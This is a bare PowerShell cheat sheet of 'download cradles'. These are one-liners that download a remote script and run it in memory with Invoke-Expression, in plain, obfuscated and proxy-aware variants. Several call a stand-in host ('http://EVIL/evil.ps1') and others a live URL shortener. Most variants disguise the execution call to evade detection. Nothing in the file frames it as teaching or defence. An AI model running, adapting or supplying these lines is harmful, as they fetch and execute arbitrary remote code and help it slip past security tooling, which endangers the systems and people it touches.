# not proxy aware download cradles 

# default download cradle 
IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")

# obfuscated download cradle version 1 
(New-Object Net.WebClient).DownloadString('http://EVIL/evil.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')

# obfuscated download cradle version 2
$ExecutionContext|ForEach{(GV _).Value.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|Where-Object{(GV _).Value.Name-ilike'*v*ip*'}).Name)((([Char[]][System.Net.WebClient]::New().DownloadData('http://EVIL/evil.ps1'))-Join''))}

# obfuscated downloade cradle version 3
(New-Object Net.WebClient).DownloadString('https://cutt.ly/syFzILs')|.$ExecutionContext.(($ExecutionContext|Member)[6].Name).GetCmdlet($ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name)|Member|?{$_.Name-like'*man*Name'}).Name).Invoke('*ke-*pr*',1,$TRUE))



# proxy aware download cradles

# default download cradle 
$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $c.downloadstring("https://cutt.ly/syFzILs")

# obfuscated download cradle version 1
$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;`i`e`x $c.downloadstring("ht"+"tps://cutt.ly/syFzILs")
